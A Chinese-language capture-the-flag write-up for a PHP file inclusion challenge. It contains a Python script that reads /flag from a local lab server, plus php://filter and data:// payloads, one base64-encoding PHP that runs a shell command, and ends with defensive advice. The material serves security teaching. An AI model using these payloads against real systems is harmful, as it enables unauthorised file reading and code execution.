# 文件包含

## 题目信息

- **题目名称**：include 进来看看
- **难度**：★★☆☆☆
- **考点**：文件包含（File Inclusion）、PHP 伪协议

## 题目描述

PHP 的 include 函数可以把任意文件的内容包含进来。这道题的后端用了 include，参数由你控制。flag 在 `/flag` 里。

## 解法步骤

### 第一步：分析功能

页面提供了三个导航链接，分别指向 `home.php`、`about.php`、`contact.php`。通过查看 URL 可以发现使用了 `file` 参数进行文件包含。

### 第二步：发现任意文件读取

将 `file` 参数改为 `/flag`，即可读取服务器上的 flag 文件：

```
/?file=/flag
```

在 PHP 中，`include()` 函数会包含指定文件并将其内容作为 PHP 代码执行。如果文件内容不包含 `<?php` 标记，PHP 会直接将其作为纯文本输出。

### 第三步：获取 Flag

**自动化 Exploit：**

```python
#!/usr/bin/env python3
import requests

BASE = 'http://127.0.0.1:13388'
r = requests.get(f'{BASE}/?file=/flag')
import re
flag = re.search(r'flag\{[^}]+\}', r.text).group()
print(f'[+] {flag}')
```

## 漏洞原理

### 文件包含漏洞

文件包含（File Inclusion）是 PHP 中最常见的漏洞之一。当 `include()`、`require()`、`include_once()`、`require_once()` 等函数的参数可以被用户控制时，攻击者可以读取或执行任意文件。

### 进阶利用

如果存在文件扩展名限制（例如 `include($file . ".php")`），可以使用 PHP 伪协议绕过：

- **php://filter**：读取文件源码
  ```
  ?file=php://filter/convert.base64-encode/resource=/flag
  ```
- **data://**：执行任意代码（需要 `allow_url_include=On`）
  ```
  ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==
  ```
- **phar://**：反序列化攻击

### 防御方法

- 避免将用户输入直接传递给文件包含函数
- 使用白名单限定可包含的文件
- 关闭 `allow_url_include`
